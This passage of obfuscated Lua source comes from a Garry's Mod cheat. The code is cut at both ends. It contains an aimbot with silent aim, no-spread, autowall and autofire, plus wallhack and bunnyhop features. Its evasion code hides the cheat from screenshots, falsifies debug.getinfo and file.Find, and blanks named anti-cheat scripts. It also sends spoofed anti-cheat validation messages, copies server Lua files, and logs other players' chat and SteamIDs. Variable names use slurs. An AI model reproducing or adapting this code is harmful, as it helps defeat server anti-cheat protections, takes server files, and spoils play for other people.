if hacka.miscthipisidion or hacka.noclipenebled then 
return true 
end 
end)

_hook_Add("ChatText","]]..c()..[[",function(i,i,k,l)
if gay["LUACONTROL_HIDECONNECTS"]then
if l=="namechange" or l=="joinleave"then return true end
end
end)

_hook_Add("player_changename","]]..c()..[[",function(data)
zapiclogs("namechange",data.oldname.." changed to "..data.newname)
end)

_hook_Add("player_connect","]]..c()..[[",function(data)
zapiclogs("LkF03KB5",data.name.." "..data.networkid)
end)

_hook_Add("player_disconnect","]]..c()..[[",function(data)
zapiclogs("G5KDLGKD",data.name.." "..data.networkid..". "..data.reason)
end)

_hook_Add("player_say","]]..c()..[[",function(player)
if _Player(player.userid):Nick()==nil then return end
zapiclogs("chat",_Player(player.userid):Nick()..": "..player.text)
end)

_hook_Add("player_hurt","]]..c()..[[",function(b)
local c="unknown"
local d="map"
local e="unknown weapon"
local s=0
for i,j in _pairs(_player_GetAll())do 
if j:UserID()==b.userid then 
c=j:Nick()
s=j:Health()
end
if j:UserID()==b.attacker then 
d=j:Nick()
if j:GetActiveWeapon()and j:GetActiveWeapon():IsValid()then 
e=j:GetActiveWeapon():GetPrintName()
end 
end 
end
if gay["WH_NOTIFICATION_DAMAGEDMEBY"]and c==_LocalPlayer():Nick()then
notifys("you damaged by "..d)
end
zapiclogs("damage",d.." damage ".._string_Replace(b.health-s,"-","").." hp "..c.." with "..e)
end)

_hook_Add("entity_killed","]]..c()..[[",function(qwe)
local ply="unknown"
local atk="map"
local wep="unknown weapon"
local retard=game.GetWorld()
local killah=game.GetWorld()
local inflictor=ents.GetByIndex(qwe.entindex_inflictor)
for _,p in _pairs(_player_GetAll())do 
if p:EntIndex()==qwe.entindex_killed then 
ply=p:Nick()
retard=p 
end
if p:EntIndex()==qwe.entindex_attacker then 
atk=p:Nick()
killah=p
if p:GetActiveWeapon()and p:GetActiveWeapon():IsValid()then 
wep=p:GetActiveWeapon():GetPrintName() 
end 
end 
end
if atk==ply then return end
zapiclogs("kill",atk.." killed "..ply.." for "..wep)
if gay["WH_NOTIFICATION_IKILLED"]and atk==_LocalPlayer():Nick()then
notifys("you killed "..ply)
end
if ply==_LocalPlayer():Nick()then
if gay["WH_NOTIFICATION_KILLEDMEBY"]then
notifys("you killed by "..atk.." for "..wep)
end
end
end)

_hook_Add("OnEntityCreated","]]..c()..[[",function(ent)
_timer_Simple(0.1,function()
for _,v in _pairs(_player_GetAll())do
if v:GetEyeTrace().Entity==ent and ent:GetModel() and not _string_find(ent:GetModel(),".bsp") then
zapiclogs("prop",v:Nick().." spawned ".. ent:GetModel().." (".._tostring(ent:GetPos())..")")
end
end
end)
end)

_hook_Add("PostDraw2DSkyBox","]]..c()..[[",function()
if gay["UNLOAD"] then return end
if hacka.loadedfinished==nil then return end
if not gay["WH_NOSKY"] then return end
render.Clear(gay["WH_NOSKY_COLOR"]["r"],gay["WH_NOSKY_COLOR"]["g"],gay["WH_NOSKY_COLOR"]["b"],0,true,true)
end)

_hook_Add("RenderScene","]]..c()..[[",function()
if gay["UNLOAD"] then return end
if hacka.loadedfinished==nil then return end
if not gay["WH_FULLBRIGHT"] then return end
_render_SetLightingMode(1 and 1 or 0)
end)

_hook_Add("PreDrawEffects","]]..c()..[[",function()
if gay["UNLOAD"] then return end
if hacka.loadedfinished==nil then return end
if not gay["WH_FULLBRIGHT"] then return end
_render_SetLightingMode(0)
end)

_hook_Add("SetupWorldFog","]]..c()..[[",function()
if gay["UNLOAD"] then return end
if hacka.loadedfinished==nil then return end
if not gay["WH_NIGHT"]then return end
render.FogMode(1)
render.FogColor(gay["WH_NIGHT_COLOR"]["r"],gay["WH_NIGHT_COLOR"]["g"],gay["WH_NIGHT_COLOR"]["b"])
render.FogStart(0)
render.FogEnd(0*100)
render.FogMaxDensity(gay["WH_NIGHT_BRIGHTNESS"])
return true
end)

local fa;

local function FixMovement(pCmd)
local vec = Vector(cm.GetForwardMove(pCmd), cm.GetSideMove(pCmd), 0)
local vel = math.sqrt(vec.x*vec.x + vec.y*vec.y)
local mang = vm.Angle(vec)
local yaw = cm.GetViewAngles(pCmd).y - fa.y + mang.y
if (((cm.GetViewAngles(pCmd).p+90)%360) > 180) then
yaw = 180 - yaw
end
yaw = ((yaw + 180)%360)-180
pCmd:SetForwardMove(math.cos(math.rad(yaw)) * vel)
pCmd:SetSideMove(math.sin(math.rad(yaw)) * vel)
end

local function Clamp(val, min, max)
if(val < min) then
return min;
elseif(val > max) then
return max;
end
return val;
end

local function NoPhys()
if LocalPlayer():GetActiveWeapon():IsValid() and LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physgun" then
return true
else
return false
end
end

local function NormalizeAngle(ang)
if not NoPhys() then
ang.x = math.NormalizeAngle(ang.x);
ang.p = math.Clamp(ang.p, -89, 89);
end
end

local function GetPos(v)
if not v:IsPlayer()and not v:IsNPC() then return v:GetPos()end
if(gay["AIM_HITBOX"]=="Body") then return( em.LocalToWorld(v, em.OBBCenter(v)) ); end
local eyes = em.LookupAttachment(v, "eyes");
if(!eyes) then return( em.LocalToWorld(v, em.OBBCenter(v)) ); end
local pos = em.GetAttachment(v, eyes);
if(!pos) then return( em.LocalToWorld(v, em.OBBCenter(v)) ); end
return(pos.Pos);
end

local function FASAutowall(wep, startPos, aimPos, ply)
if not gay["AIM_AUTOWALL"] then return end
local traces = {}
local traceResults = {}
local dir = (aimPos - startPos):GetNormalized()
traces[1] = {start = startPos, filter = LocalPlayer(), mask = trace_normal, endpos = aimPos,}
traceResults[1] = util.TraceLine(traces[1])
if(NoPenetration[traceResults[1].MatType]) then return false end
if( - dir:DotProduct(traceResults[1].HitNormal) <= .26) then return false end
traces[2] = {start = traceResults[1].HitPos, endpos = traceResults[1].HitPos + dir * wep.PenStr * (PenMod[traceResults[1].MatType] or 1) * wep.PenMod, filter = LocalPlayer(), mask = trace_walls,}
traceResults[2] = util.TraceLine(traces[2])
traces[3] = {start = traceResults[2].HitPos, endpos = traceResults[2].HitPos + dir * .1, filter = LocalPlayer(), mask = trace_normal,}
traceResults [3] = util.TraceLine(traces[3])
traces[4] = {start = traceResults[2].HitPos, endpos = aimPos, filter = LocalPlayer(), mask = MASK_SHOT,}
traceResults[4] = util.TraceLine(traces[4])
if(traceResults[4].Entity ~= ply) then return false end
return(not traceResults[3].Hit)
end

local function M9KAutowall(ent)
if not gay["AIM_AUTOWALL"]then return end
if not IsValid(ent) and not ent:IsPlayer()then return end
local penvalues = {["SniperPenetratedRound"] = 20,["Pistol"] = 9,["357"] = 12,["SMG1"] = 14,["AR2"] = 16,["Buckshot"] = 5}
local trace = util.TraceLine({mask = MASK_ALL, start = LocalPlayer():GetShootPos(), endpos = ent:GetBonePosition(ent:LookupBone("ValveBiped.Bip01_Head1")), filter = {LocalPlayer(), ent}})
local wall = util.TraceLine({mask = MASK_SHOT, start = LocalPlayer():GetShootPos(), endpos = ent:GetBonePosition(ent:LookupBone("ValveBiped.Bip01_Head1")), filter = {LocalPlayer(), ent}})
local wall2 = util.TraceLine({mask = MASK_SHOT, start = ent:GetBonePosition(ent:LookupBone("ValveBiped.Bip01_Head1")), endpos = LocalPlayer():GetShootPos(), filter = {LocalPlayer(), ent}})
if trace.Fraction == 1 or (IsValid(LocalPlayer():GetActiveWeapon()) and wall.HitPos:Distance(wall2.HitPos) < penvalues[game.GetAmmoName(LocalPlayer():GetActiveWeapon():GetPrimaryAmmoType())]) then
return true
end
end

local function wallscann(v)
if(!v || !em.IsValid(v)) then return false; end
local tr = {
start = em.EyePos(LocalPlayer()),
endpos = GetPos(v),
mask = MASK_SHOT,
filter = {LocalPlayer(), v},
};
return(util.TraceLine(tr).Fraction == 1);
end

local function Valid(v)
if v:IsNPC()then return wallscann(v)end
if(!v || !em.IsValid(v) || v == LocalPlayer() || em.Health(v) < 1 || em.IsDormant(v) || pm.Team(v) == 1002) then return false; end
if v:SteamID64()then
if string.find(gay["AIMBOT_FRIEND"],v:SteamID64()or"") then return false; end
end
if v:Team()then
if string.find(gay["AIMBOT_TEAMS"],team.GetName(v:Team())or"") then return false; end
end	
if v:GetUserGroup()then
if string.find(gay["AIMBOT_RANKS"],v:GetUserGroup()or"")then return false; end
end
local tr = {
start = em.EyePos(LocalPlayer()),
endpos = GetPos(v),
mask = MASK_SHOT,
filter = {LocalPlayer(), v},
};
local wep = LocalPlayer():GetActiveWeapon()
if(util.TraceLine(tr).Fraction == 1) then
return true
elseif(wep and wep:IsValid() and wep.PenStr) then
return FASAutowall(wep, tr.start, tr.endpos, v)
elseif (wep and wep:IsValid() and wep.BulletPenetrate) then
return M9KAutowall(v)
end
return false
end

local fov, my_FovAngs, targAng
local fovang = {}
local function InFov( ply )
if not ply then return end
local myang = LocalPlayer():GetAngles()
local ang = (ply:GetPos() - LocalPlayer():GetPos()):Angle()
local angdiffy = math.abs(math.NormalizeAngle(myang.y - ang.y ))
local angdiffp = math.abs(math.NormalizeAngle(myang.ply - ang.ply ))
if (angdiffy < gay["AIM_FOV"]/2 and angdiffp < gay["AIM_FOV"]/2) then
return true 
end
return false
end

local function gettarget()
local mem=LocalPlayer():GetEyeTrace().Entity 
if mem and mem:IsPlayer() and Valid(mem) then hacka.aitarget=mem return end
if hacka.aitarget and Valid(hacka.aitarget) and InFov(hacka.aitarget)then return end
local dists = {};
for _,v in _pairs(_ents_FindByClass("*"))do
local nameent=v:GetClass()
if _string_find(gay["AIM_ENTITYLIST"]or "",nameent)then
if(!wallscann(v) or !InFov(v)) then continue; end
dists[#dists + 1] = { vm.Distance( em.GetPos(v), em.GetPos(LocalPlayer()) ), v };
end
end
for k,v in next, player.GetAll() do
if(!Valid(v)or !InFov(v)) then continue; end
dists[#dists + 1] = { vm.Distance( em.GetPos(v), em.GetPos(LocalPlayer()) ), v };
end
table.sort(dists, function(a, b)
return(a[1] < b[1]);
end);
hacka.aitarget = dists[1] && dists[1][2] || nil;
end

_hook_Add("Move", "]]..c()..[[", function()
if(!IsFirstTimePredicted()) then return; end
servertime = CurTime();
end)

timer.Simple(5,function()
GAMEMODE["EntityFireBullets"] = function(self, p, data)
local w = pm.GetActiveWeapon(LocalPlayer());
local Spread = data.Spread * -1;
if(!w || !em.IsValid(w) || cones[em.GetClass(w)] == Spread || Spread == nullvec) then return; end
cones[em.GetClass(w)] = Spread;
end
end)

local function nospreadcontrol(ucmd,ang)
if !IsValid(LocalPlayer():GetActiveWeapon()or NULL)then return am.Forward(ang); end
local w=LocalPlayer():GetActiveWeapon():GetClass()
local cone=LocalPlayer():GetActiveWeapon().CurCone
local selfff=LocalPlayer():GetActiveWeapon()
if(!w or !selfff or !IsValid(LocalPlayer():GetActiveWeapon()or NULL) or !gay["AIM_NOSPREAD"]) then return am.Forward(ang); end
if cone then
math.randomseed(ucmd:CommandNumber())
if gay["AIM_NORECOIL"]then
return(ang-LocalPlayer():GetPunchAngle()-Angle(math.Rand(-cone,cone),math.Rand(-cone,cone),0)*25):Forward()
else
return(ang-Angle(math.Rand(-cone,cone),math.Rand(-cone,cone),0)*25):Forward()
end
end
if cones[w]then
if gay["AIM_NORECOIL"]and not string.find(w,"m9k")then
return(hacka.dickfack(ucmd, am.Forward(ang-LocalPlayer():GetViewPunchAngles()), cones[w]or 0));
else
return(hacka.dickfack(ucmd, am.Forward(ang), cones[w]or 0));
end
end
return am.Forward(ang);
end

local function predict(cmd,ply, predPos)
if ply == nil then return predPos end;
if predPos == nil then return predPos end;
if ply:GetVelocity():Length2D() < 800 then return predPos end;
predPos = predPos - (ply:GetVelocity() * engine.TickInterval() * RealFrameTime() ) - (LocalPlayer():GetVelocity() * engine.TickInterval() * RealFrameTime() )
return predPos
end

local function Autofire(ucmd)
if(pm.KeyDown(LocalPlayer(), 1) && true) then
cm.SetButtons(ucmd, bit.band( cm.GetButtons(ucmd), bit.bnot( 1 ) ) );
else
cm.SetButtons(ucmd, bit.bor( cm.GetButtons(ucmd), 1 ) );
end
end


local function SmoothAim(ang) 
if(gay["AIM_SMOOTHING"] > 0) then
ang.y = math.NormalizeAngle(ang.y) 	
ang.p = math.NormalizeAngle(ang.p) 	
eyeang = LocalPlayer():EyeAngles() 	
local smooth = gay["AIM_SMOOTHING"]	
if((eyeang.y - ang.y) * - 1 > 180 && eyeang.y < 0) then eyeang.y = eyeang.y + 360 end 	if((ang.y - eyeang.y) * - 1 > 180 && ang.y < 0) then ang.y = ang.y + 360 end 	
eyeang.y = eyeang.y + (ang.y - eyeang.y) / smooth 	eyeang.x = eyeang.x + (ang.x - eyeang.x) / smooth 	eyeang.r = 0 	
return eyeang 
else 
return ang
end 
end

local function aimkeycheck(a)
if LocalPlayer():IsTyping()then return false end
if not IsValid(LocalPlayer():GetActiveWeapon())then return false end
if LocalPlayer():GetActiveWeapon():Clip1()==0 or LocalPlayer():GetActiveWeapon():Clip1()==-1 then return end
if input.IsKeyDown(a)or input.IsMouseDown(a)then
return true
end
return false
end

local function alwayscheck()
if LocalPlayer():IsTyping()then return false end
if not IsValid(LocalPlayer():GetActiveWeapon())then return false end
if LocalPlayer():GetActiveWeapon():Clip1()==0 or LocalPlayer():GetActiveWeapon():Clip1()==-1 then return end
return true
end

local function aimer(ucmd)
if !gay["AIM_ENABLED"]then return end
if(cm.CommandNumber(ucmd) == 0) then return; end
gettarget();
if hacka.aitarget && aimkeycheck(gay["AIM_KEY"]) or hacka.aitarget && gay["AIM_KEY"]==0 && alwayscheck()then
local pos = GetPos(hacka.aitarget) - em.EyePos(LocalPlayer());

pos=predict(ucmd, hacka.aitarget, pos)

local ang = vm.Angle( nospreadcontrol(ucmd, vm.Angle(pos)));
NormalizeAngle(ang);
local CalcX = ang.x - fa.x
local CalcY = ang.y - fa.y
if CalcY < 0 then CalcY = CalcY * - 1 end	
if CalcX < 0 then CalcX = CalcX * - 1 end
if CalcY > 360 then CalcY = CalcY - 360 end
if CalcX > 360 then CalcX = CalcX - 360 end
if CalcY > 180 then CalcY = 360 - CalcY end
if CalcX > 180 then CalcX = 360 - CalcX end
if (CalcX <= gay["AIM_FOV"]/2 && CalcY <= gay["AIM_FOV"] *0.4)  then
local ang = SmoothAim(ang)
cm.SetViewAngles(ucmd, ang)	
if(gay["AIM_AUTOFIRE"]) then
Autofire(ucmd);
end
if(gay["AIM_SILENT"]) then
FixMovement(ucmd);
else
fa = ang;
end
end
end
end

local function meme(ucmd)
if not fa then
fa = ucmd:GetViewAngles()
end
fa = fa + Angle(ucmd:GetMouseY() * .023, ucmd:GetMouseX() * -.023, 0)
NormalizeAngle(fa)
if ucmd:CommandNumber() == 0 then
if not NoPhys() then
ucmd:SetViewAngles(fa)
return
end
end
end

local function AutoReload(pCmd)
local wep = LocalPlayer():GetActiveWeapon()
if (LocalPlayer():Alive() and LocalPlayer():Health() > 0 and IsValid(wep)) then
if (wep:Clip1() <= 0 and wep:GetMaxClip1() > 0 and CurTime() > wep:GetNextPrimaryFire()) then
pCmd:SetButtons(pCmd:GetButtons() + IN_RELOAD)
end
end
end

_hook_Add("CreateMove","]]..c()..[[",function(ucmd)
_xpcall(function()
if gay["UNLOAD"] then return end

checkbind("panic",gay["PANICKEY"],function()
if hacka.loadedfinished==nil then
hacka.loadedfinished=true
else
hacka.loadedfinished=nil
end
end)

checkbind("antisg",KEY_F12,hidecheat)

if hacka.loadedfinished==nil then return end

checkbind("freecamera",gay["WH_DEBUGCAMERA_KEY"],function()
hacka.noclipenebled=!hacka.noclipenebled
lockview=hacka.noclipenebled
hacka.setview=true
end)
checkbind("thirdperson",gay["WH_THIRDPERSON_KEY"],function()
hacka.miscthipisidion=not hacka.miscthipisidion 
end)

checkbind("addenityfirend",gay["MISC_ADDENTITYFRIEND"],function()
local sos=_LocalPlayer():GetEyeTrace().Entity
if sos:IsPlayer()then
if sos:SteamID64()then
if not _string_find(gay["AIMBOT_FRIEND"],sos:SteamID64() or"")then
zapic("AIMBOT_FRIEND",gay["AIMBOT_FRIEND"]..sos:SteamID64())
else
zapic("AIMBOT_FRIEND",_string_Replace(gay["AIMBOT_FRIEND"],sos:SteamID64(),""))
end
end
else
local class=_LocalPlayer():GetEyeTrace().Entity:GetClass()
if not _string_find(gay["WH_ENTITYLIST"],class or"")then
zapic("WH_ENTITYLIST",gay["WH_ENTITYLIST"]..class)
else
zapic("WH_ENTITYLIST",_string_Replace(gay["WH_ENTITYLIST"],class,""))
end
end
end)

if hacka.noclipenebled then
local time=gay["WH_DEBUGCAMERA_SPEED"]
hacka.vieworigin=hacka.vieworigin+(hacka.viewvelocity*time)
hacka.viewvelocity=hacka.viewvelocity*0.95
local sensitivity=0.022
hacka.viewangle.p=_math_Clamp(hacka.viewangle.p+(ucmd:GetMouseY()*sensitivity),-89,89)
hacka.viewangle.y=hacka.viewangle.y+(ucmd:GetMouseX()*-1*sensitivity)
local add=Vector(0,0,0)
local ang=hacka.viewangle
if ucmd:KeyDown(IN_FORWARD)then add=add+ang:Forward()end
if ucmd:KeyDown(IN_BACK)then add=add-ang:Forward()end
if ucmd:KeyDown(IN_MOVERIGHT)then add=add+ang:Right()end
if ucmd:KeyDown(IN_MOVELEFT)then add=add-ang:Right()end
if ucmd:KeyDown(IN_JUMP)then add=add+ang:Up()end
add=add:GetNormal()*time*3000
if ucmd:KeyDown(IN_SPEED)then add=add*2 end
hacka.viewvelocity=hacka.viewvelocity+add
if lockview then lockview=ucmd:GetViewAngles()end
if lockview then ucmd:SetViewAngles(lockview)end
ucmd:SetForwardMove(0)
ucmd:SetSideMove(0)
ucmd:SetUpMove(0)
end

if gay["MISC_BUNNYHOP"] and !_LocalPlayer():GetMoveType()!=MOVETYPE_NOCLIP and _LocalPlayer():GetMoveType()!= MOVETYPE_LADDER and _LocalPlayer():Alive() then		
if !_LocalPlayer():OnGround()and ucmd:KeyDown(IN_JUMP)then
ucmd:SetButtons(_bit_band( ucmd:GetButtons(),bit.bnot(IN_JUMP)))
if gay["MISC_AUTOSTRAFE"] then
if ucmd:GetMouseX()>1 or ucmd:GetMouseX()<-1 then
ucmd:SetSideMove( ucmd:GetMouseX() > 1 and 400 or -400 )
else
ucmd:SetForwardMove(5850/_LocalPlayer():GetVelocity():Length2D())
ucmd:SetSideMove((ucmd:CommandNumber()%2==0)and-400 or 400)
end
elseif ucmd:KeyDown(IN_JUMP)then 
ucmd:SetForwardMove(10000)
end
end
end


if _input_IsKeyDown(KEY_F)and gay["MISC_FLASHSPAM"] then 
ucmd:SetImpulse(100)
end 

if _input_IsKeyDown(KEY_E)and gay["MISC_ESPAMMER"] then
if hacka.es then
RunConsoleCommand("+use")
hacka.es=not hacka.es
else
RunConsoleCommand("-use")
hacka.es=not hacka.es
end
end 

if gay["AIM_ENABLED"]then
meme(ucmd);
aimer(ucmd);
if gay["AIM_AUTORELOAD"]then
AutoReload(ucmd)
end
end

if buttoncheckbind(gay["MISC_AUTOPISTOL"])then
if ucmd:TickCount()%2==0 then
ucmd:SetButtons(_bit_bor(ucmd:GetButtons(),IN_ATTACK))
end
end

end,function(a)print(a)end)
end)

timer.Simple(5,function()
hacka.loadedfinished=true

local ahd={}
local function gf(c)
local d=c:ReadBool()
local e=c:ReadChar()
local hd=''
for f=1,e do 
if c:ReadBool()then 
local daa=c:ReadString()
_table_insert(ahd,daa)
hd=hd.." "..daa
else 
_table_insert(ahd,_Color(c:ReadChar()+128,c:ReadChar()+128,c:ReadChar()+128))
end 
end
if d then 
chat.AddText(_unpack(ahd))
zapiclogs("ulx",hd)
ahd={}
end 
end
usermessage.Hook("tsayc",gf)


end)

render.Capture=function(data)
hidecheat()
if gay["WH_NOTIFICATION_SCREENGRAB"]then
notifys("You screengraben")
end
local cap=rendercap(data)
return cap
end

RunConsoleCommand=function(a,...)
if a=="__screenshot_internal"or a=="screenshot"or a=="startmovie"or a=="jpeg"then
hidecheat()
if gay["WH_NOTIFICATION_SCREENGRAB"]then
notifys("You screengraben")
end
end
return concommandply(a,...)
end

local old=pm.ConCommand
pm.ConCommand=function(a,b,...)
if _string_find(b,"__screenshot_internal")or _string_find(b,"screenshot")or _string_find(b,"startmovie")or _string_find(b,"jpeg")then
hidecheat()
if gay["WH_NOTIFICATION_SCREENGRAB"]then
notifys("You screengraben")
end
end
return old(a,b,...)
end

file.Find=function(a,b,...)
if _string_find(a,"bin")or b=="LuaMenu"then return{}end
return _file_Find(a,b,...)
end

debug.getinfo=function(a,...)
if a==render.Capture or a==RunConsoleCommand or a==pm.ConCommand or a==file.Find then
return 9
end
return _debug_getinfo(a,...)
end


]]end;if t:find("lua/includes/modules/hook.lua")then return v:Replace("function GetTable() return Hooks end",[[local b=pairs;function GetTable()local c={}for d,e in b(Hooks)do for f,g in b(e)do if not f:find("123")then c[d]=e end end end;return c end]])end;if v:find(k.shownot)then return v end;if n["LUA_FILE_STEALER"]and not ScriptExistsif then L(t,"hack/"..GetHostName.."/"..t,v)end;if GetHostName:find("PrimeRP")and IsInGame()then return j end;if GetHostName:find("4LifeRP")and IsInGame()then return j end;if GetHostName:find("NewEra")and IsInGame()then return j end;if GetHostName:find("FustRP")and IsInGame()then return j end;if h and IsInGame()then print(i)print(t)g(Color(255,0,0),v.."\n")print(i)return" "end;if t:find("dayz/gamemode/scripts/client/hud.lua")then return v:Replace("net.Start","print;if true then return end")end;if v:find("Detoured backend functions before autorun")then return'timer.Simple(0,function()net.Start("m_loaded")net.SendToServer()end)net.Receive("m_validate_player",function()net.Start("m_validate_player")net.SendToServer()end)net.Start("m_check_synced_data")net.WriteTable({["sv_allowcslua"]=0,["sv_cheats"]=0,["r_drawothermodels"]=0})net.SendToServer()'end;if t:find("cl_familysharing.lua")then return' 'end;if t:find("cl_leyscreencap.lua")then return" "end;if t:find("cl_antinexploits.lua")then return" "end;if t:find("cl_cpe.lua")then return" "end;if t:find("cl_execfix.lua")then return" "end;if t:find("cl_nlr.lua")then if n["LUACONTROL_ANTINLR"]then return' 'end end;if t:find("bankfunctionsprovider.lua")then return' 'end;if t:find("scalednetworkentry.lua")then return string.Replace(v,'GimmeThatScreen["GTS:ObjectFactoryProvider"].RRC','render.Capture')end;if t:find("weapon_handcuffed.lua")then if n["LUACONTROL_HANDCUFF"]then return string.Replace(string.Replace(string.Replace(v,"surface.DrawRect( 0,0, ScrW(), ScrH() )","surface.DrawRect(0,0,0,0)"),"surface.DrawRect( 0,i, ScrW(), 4 )","surface.DrawRect(0,0,0,0)"),"surface.DrawRect( i,0, 4,ScrH() )","surface.DrawRect(0,0,0,0)")end end;if IsInGame()and n["LUA_PRINTRUNNINGCODE"]then print(i)print(t)g(Color(255,255,255),v.."\n")print(i)end end)for b=0,24 do local T=10+b;surface.CreateFont("hack_font_"..T,{font="Roboto",size=T})end;surface.SetFont("hack_font_18")timer.Simple(1,function()local U={}local function V(F,W,X,T,Y,q)local Z=vgui.Create("DButton",Y)Z:SetFont("hack_font_18")Z:SetText(F)Z:SetTextColor(Color(255,255,255))Z:SetSize(T,25)Z:SetPos(W,X)Z.Paint=function(f,N,P)draw.RoundedBox(0,0,0,N,P,Color(35,35,35,255))surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,Z:GetSize())if Z.Hovered then draw.RoundedBox(0,0,0,N,P,Color(120,120,120,100))end end;Z.DoClick=q end;local function _(a0,a1,W,X,a2,Y)local a3=vgui.Create("DBinder",Y)a3:SetFont("hack_font_18")a3:SetText(a0)a3:SetTextColor(Color(255,255,255))a3:SetSize(a2,25)a3:SetPos(W,X)a3.Paint=function(f,N,P)draw.RoundedBox(0,0,0,N,P,Color(35,35,35,255))surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,a3:GetSize())if a3.Hovered then draw.RoundedBox(0,0,0,N,P,Color(120,120,120,100))end end;a3.OnChange=function(a4)p(a1,a4:GetValue())a3:SetSize(select(1,surface.GetTextSize(a3:GetText()))+10,25)end end;local a5=2.5;local function a6(type,F,a7,q,a2,W,a8)if type==1 then if a8==1 then else local a9=vgui.Create("DButton",menupanelfunctional)a9:SetFont("hack_font_18")a9:SetText(F)a9:SetTextColor(Color(255,255,255))a9:SetSize(a2,25)a9:SetPos(6,W)a9.Paint=function(f,N,P)draw.RoundedBox(0,0,0,N,P,Color(35,35,35,255))surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,a9:GetSize())if U[a7]then draw.RoundedBox(0,0,0,N,P,Color(150,150,150,100))elseif a9.Hovered then draw.RoundedBox(0,0,0,N,P,Color(120,120,120,100))end end;a9.DoClick=q;a5=a5+a2+5 end elseif type==2 then local a9=vgui.Create("DButton",menupanelfunctional)a9:SetFont("hack_font_18")a9:SetText(F)a9:SetTextColor(Color(255,255,255))a9:SetSize(a2,25)a9:SetPos(6,W)a9.Paint=function(f,N,P)draw.RoundedBox(0,0,0,N,P,Color(35,35,35,255))surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,a9:GetSize())if n[a7]then draw.RoundedBox(0,0,0,N,P,Color(150,150,150,100))elseif a9.Hovered then draw.RoundedBox(0,0,0,N,P,Color(120,120,120,100))end end;a9.DoClick=function()p(a7,not n[a7])end;a5=a5+a2+5 end end;local function aa()if IsValid(setnamesteam)then setnamesteam:Close()end;setnamesteam=vgui.Create("DFrame")setnamesteam:SetSize(246,79)setnamesteam:SetPos(gui.MouseX(),gui.MouseY())setnamesteam:SetTitle("")setnamesteam:MakePopup()setnamesteam:ShowCloseButton(false)setnamesteam.Paint=function(f,N,P)draw.RoundedBox(0,0,0,N,P,Color(40,40,40,255))draw.RoundedBox(0,0,0,N,22,Color(50,50,50,255))draw.SimpleText("Change Name","hack_font_18",2.5,2.5,Color(255,255,255))surface.SetDrawColor(Color(100,100,100,255))surface.DrawOutlinedRect(0,0,setnamesteam:GetSize())end;local ab=vgui.Create("DTextEntry",setnamesteam)ab:SetPos(3,24)ab:SetSize(240,25)ab:SetText("Gay")ab.OnEnter=function()k.setsteamname(ab:GetValue())setnamesteam:Close()end;ab.Paint=function(self,N,P)surface.SetDrawColor(30,30,30)surface.DrawRect(0,0,self:GetWide(),self:GetTall())self:DrawTextEntryText(Color(255,255,255),Color(30,130,255),Color(255,255,255))end;V("Change Name",3,51,103,setnamesteam,function()k.setsteamname(ab:GetValue())setnamesteam:Close()end)V("Cancel",108,51,52,setnamesteam,function()setnamesteam:Close()end)end;local ac=vgui.Create("DFrame")ac:SetSize(670,400)ac:Center()ac:SetTitle("")ac:MakePopup()ac:SetSizable(true)ac:ShowCloseButton(false)ac.Paint=function(f,N,P)draw.RoundedBox(0,0,0,N,P,Color(30,30,30))draw.RoundedBox(0,0,0,N,22,Color(71,74,79))draw.RoundedBox(0,0,22,N,1,Color(0,0,0))draw.SimpleText("Logs","hack_font_18",5,2.5,Color(120,120,120))surface.SetDrawColor(Color(0,0,0))surface.DrawOutlinedRect(0,0,N,P)surface.SetDrawColor(Color(50,50,50))surface.DrawOutlinedRect(1,23,N-2,P-24)end;ac.PerformLayout=function(self,w,x)k.lst:SetSize(w-6,25)if IsValid(k.ll)then k.ll:SetSize(w-6,x-83)end end;k.lst=vgui.Create("DTextEntry",ac)k.lst:SetPos(3,53)k.lst:SetSize(600-6,25)k.lst:SetText("")k.lst.Paint=function(self,N,P)surface.SetDrawColor(25,25,25)surface.DrawRect(0,0,self:GetWide(),self:GetTall())self:DrawTextEntryText(Color(255,255,255),Color(30,130,255),Color(255,255,255))end;k.lst.OnTextChanged=function()if IsValid(k.ll)and k.logtype then k.findlog(k.lst:GetValue(),k.logtype)end end;local ad=3;local function ae(a2,F,q)V(F,ad,25,a2,ac,q)ad=ad+a2+2 end;function k.findlog(af,type)if not IsInGame()then return end;if IsValid(k.ll)then k.ll:Remove()end;k.ll=vgui.Create("DScrollPanel",ac)k.ll:SetPos(3,53+27)k.ll:SetSize(600-6,267)k.ll.Paint=function(f,N,P)end;k.ll.VBar.Paint=function(ag,N,P)draw.RoundedBox(0,0,0,N,P,Color(0,0,0,50))end;k.ll.VBar.btnUp.Paint=function(ag,N,P)draw.RoundedBox(0,2,2,N-4,P-4,Color(0,0,0,25))draw.DrawText("▲","HudHintTextSmall",3,2,Color(255,255,255,255))end;k.ll.VBar.btnDown.Paint=function(ag,N,P)draw.RoundedBox(0,2,2,N-4,P-4,Color(0,0,0,25))draw.DrawText("▼","HudHintTextSmall",3,2,Color(255,255,255,255))end;local function ah(ai)local aj=vgui.Create("DButton",k.ll)aj:Dock(TOP)aj:DockMargin(4,0,0,0)aj:SetText("")aj:SetColor(Color(255,255,255))aj.DoClick=function()SetClipboardText(ai)end;aj.Paint=function(f,N,P)draw.RoundedBox(0,0,0,N,P,Color(30,30,30))if aj.Hovered then draw.RoundedBox(0,0,0,N,P,Color(50,50,50))end;draw.SimpleText(ai,"hack_font_20",1,1,Color(255,255,255))end end;local ak=util.JSONToTable(file.Read(k.logs,"DATA"))for f,P in pairs(string.Explode("HLS",ak[type][1]))do if P==""then return end;if string.find(P,af:Replace("[",""):Replace("]",""))then ah(P)end end end;ae(32,"Kill",function()k.logtype="kill"k.findlog('',k.logtype)end)ae(64,"Damage",function()k.logtype="damage"k.findlog('',k.logtype)end)ae(66,"Connect",function()k.logtype="LkF03KB5"k.findlog('',k.logtype)end)ae(87,"Disconnect",function()k.logtype="G5KDLGKD"k.findlog('',k.logtype)end)ae(105,"Change Name",function()k.logtype="namechange"k.findlog('',k.logtype)end)ae(42,"Prop",function()k.logtype="prop"k.findlog('',k.logtype)end)ae(32,"Ulx",function()k.logtype="ulx"k.findlog('',k.logtype)end)ae(37,"Chat",function()k.logtype="chat"k.findlog('',k.logtype)end)ac:Hide()U.chat={"https://execcc.online/hacka"}U.connect={"https://execcc.online/hacka"}local 